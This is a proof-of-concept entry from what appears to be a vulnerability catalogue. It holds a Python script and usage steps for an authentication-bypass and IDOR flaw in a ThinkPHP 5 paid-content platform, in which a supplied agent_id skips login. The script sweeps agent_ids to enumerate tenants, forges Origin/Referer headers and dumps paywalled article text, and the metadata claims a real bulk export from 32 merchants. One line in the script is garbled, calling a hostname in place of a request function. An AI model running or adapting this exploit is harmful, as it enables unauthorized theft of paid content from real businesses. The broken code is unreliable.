# agent_id 鉴权分支绕过 —— 免登录读取付费内容平台正文（goodsHistory/goodsList/goodsDetail）

- **code**: agent_id-鉴权分支绕过-免登录读取付费内容平台正文-goodshistory-goodslist-goodsdetail
- **kind**: poc
- **category**: auth-bypass
- **component**: ThinkPHP 5 自建「圣誉科技」付费内容平台
- **severity**: critical
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在 example.com 实测：agent_id=7 免登录读到 goods_id=1167（188元档）正文「04、05、09、11、14、18、19、21、23、28、29、41、42、43、45」，与去掉 agent_id 后的 401 形成对照。全量导出 810 个商品 / 1426 条往期记录 / 24452 字，覆盖 32 个商户，标价合计 856880.29 元。
- **path**: pocs/agent_id-鉴权分支绕过-免登录读取付费内容平台正文-goodshistory-goodslist-goodsdetail/gd_poc.py
- **tags**: auth-bypass,idor,未授权,付费内容,agent_id,thinkphp,thinkphp5
- **created_at**: 2026-10-01T14:08:14.476Z
- **found_by**: vuln-scan

## 描述

付费内容平台的自建 ThinkPHP 5 接口把「agent_id 非空」当作已鉴权分支，跳过登录校验。带上商品属主的 agent_id 即可免登录调用 goodsList/goodsDetail/goodsHistory，其中 goodsHistory 直接返回付费正文 content 与嵌套 goods_info 内第二份 content，完全绕过打赏付费校验。

## 用法

```
1) 找栏目 id：POST /api/home_info/menuHomeList -d "shop_user_id=N"（免登录）→ data[].id
2) 找 agent_id：POST /api/home_info/goodsList -d "goods_one_id=<栏目id>&switch=all&sort=all&page=1&limit=50&agent_id=<N>" 扫描 N，命中的响应里 data.current[].user_id 就是租户 id（注意 sort 必填，否则报「价格排序不能为空」）
3) 读正文：POST /api/home_info/goodsHistory -d "goods_id=<商品id>&page=1&limit=50&agent_id=<租户id>" → data[].content 即付费正文

CLI:
python3 gd_poc.py --base https://example.com --goods-one-id 32 --agent-id 7
python3 gd_poc.py --base https://example.com --sweep 1 200
python3 gd_poc.py --base https://example.com --goods-id 1167 --agent-id 7 --dump out.txt

注意：
- Origin/Referer 必须与目标 host 一致，否则子域返 403「跨域检测无效」
- agent_id 必须是商品属主 user_id，任意值无效（实测 aid=1/65/999999 对 gid=1225 返 code:0）
- 请求间隔 >=0.4s
```

## 正文

```
#!/usr/bin/env python3
"""
agent_id 鉴权分支绕过 —— 免登录读取付费内容平台正文
适用：/api/home_info/{goodsList,goodsDetail,goodsHistory} 且把 agent_id 非空当已鉴权分支的站点。

用法:
  python3 gd_poc.py --base https://target.example --goods-one-id 32 --agent-id 7
  python3 gd_poc.py --base https://target.example --sweep 1 200      # agent_id 扫描
"""
import argparse, json, sys, time

import requests

HDR = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/203.0.113.48 Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",
}


def call(base, path, data, pace=0.4, **kw):
    """Per-host Origin/Referer 必须匹配，否则子域返回 403「跨域检测无效」。"""
    h = dict(HDR)
    h["Origin"] = base
    h["Referer"] = base + "/h5/"
    h.update(kw)
    time.sleep(pace)
    try:
        r = target9.example.com(base + path, data=data, headers=h, timeout=15, verify=False)
        try:
            return r.status_code, r.json()
        except Exception:
            return r.status_code, {"raw": r.text[:300]}
    except Exception as e:
        return None, {"err": str(e)}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", required=True, help="e.g. https://example.com")
    ap.add_argument("--goods-one-id", type=int, help="栏目 id (goods_one_id)")
    ap.add_argument("--agent-id", type=int, help="租户 user_id —— 必须等于商品属主")
    ap.add_argument("--goods-id", type=int, help="单个商品 id，配合 --agent-id 读 goodsHistory 正文")
    ap.add_argument("--sweep", nargs=2, type=int, metavar=("LO", "HI"),
                    help="扫描 agent_id 区间，找哪个租户能出数据")
    ap.add_argument("--pace", type=float, default=0.4)
    ap.add_argument("--dump", help="把正文写到该文件")
    a = ap.parse_args()
    b = a.base.rstrip("/")

    if a.sweep:
        lo, hi = a.sweep
        for aid in range(lo, hi + 1):
            st, o = call(b, "/api/home_info/goodsList",
                         {"goods_one_id": a.goods_one_id or 1, "switch": "all",
                          "sort": "all", "keywords": "", "page": 1, "limit": 50,
                          "agent_id": aid}, a.pace)
            d = o.get("data")
            cur = (d.get("current") or []) if isinstance(d, dict) else (d if isinstance(d, list) else [])
            if o.get("code") == 1 and cur:
                print("[HIT] agent_id=%d -> %d goods, user_id set=%s"
                      % (aid, len(cur), sorted({g.get('user_id') for g in cur})))
            elif o.get("code") not in (0, 1):
                print("      agent_id=%d http=%s code=%s msg=%s" % (aid, st, o.get("code"), o.get("msg")))
        return

    if a.goods_id and a.agent_id:
        st, o = call(b, "/api/home_info/goodsHistory",
                     {"goods_id": a.goods_id, "page": 1, "limit": 50,
                      "agent_id": a.agent_id}, a.pace)
        print("goodsHistory(goods_id=%s, agent_id=%s) http=%s code=%s"
              % (a.goods_id, a.agent_id, st, o.get("code")))
        for rec in (o.get("data") or []):
            body = rec.get("content") or ""
            print("  [%s] %s  price=%s  %d chars"
                  % (rec.get("goods_id"), rec.get("goods_name"), rec.get("price"), len(body)))
            print("   ", body[:300].replace("\n", " "))
            if a.dump:
                with open(a.dump, "a", encoding="utf-8") as f:
                    f.write("=== goods_id=%s %s (price=%s)\n%s\n"
                            % (rec.get("goods_id"), rec.get("goods_name"), rec.get("price"), body))
        if not (o.get("data") or []):
            print("  无数据：agent_id 必须等于该商品属主 user_id（不是任意值）")
        return

    if a.goods_one_id and a.agent_id:
        st, o = call(b, "/api/home_info/goodsList",
                     {"goods_one_id": a.goods_one_id, "switch": "all", "sort": "all",
                      "keywords": "", "page": 1, "limit": 50, "agent_id": a.agent_id}, a.pace)
        d = o.get("data") or {}
        cur = d.get("current") if isinstance(d, dict) else d
        print("goodsList(goods_one_id=%s, agent_id=%s) http=%s code=%s -> %d goods"
              % (a.goods_one_id, a.agent_id, st, o.get("code"), len(cur or [])))
        for g in (cur or [])[:20]:
            print("  id=%-6s user_id=%-4s price=%-9s is_can_buy=%s %s"
                  % (g.get("id"), g.get("user_id"), g.get("price"),
                     g.get("is_can_buy"), (g.get("goods_name") or "")[:34]))
        return

    ap.print_help()


if __name__ == "__main__":
    main()
```
